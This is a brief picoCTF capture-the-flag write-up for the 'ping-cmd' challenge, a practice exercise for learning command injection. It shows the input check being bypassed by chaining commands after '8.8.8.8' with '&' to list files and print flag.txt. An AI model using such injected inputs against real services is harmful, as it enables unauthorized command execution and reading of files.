# ping-cmd

**Link**: https://play.picoctf.org/practice/challenge/759

**Difficulty**: easy

## Description

Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

## Resources


## How to solve

The serve just give the nc command

    nc mysterious-sea.picoctf.net PORT

By connecting it gives

    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):

Here if u just send a ip only the ip '8.8.8.8' will work, and it will give

        Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.52 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.72 ms

    --- 8.8.8.8 ping statistics ---
    2 packets transmitted, 2 received, 0% packet loss, time 1002ms
    rtt min/avg/max/mdev = 9.520/9.619/9.719/0.099 ms


That is not helpful, but you can send more command using &

    8.8.8.8 & ls

    8.8.8.8 & cat name_file

in particular

    8.8.8.8 & cat flag.txt

will print the flag

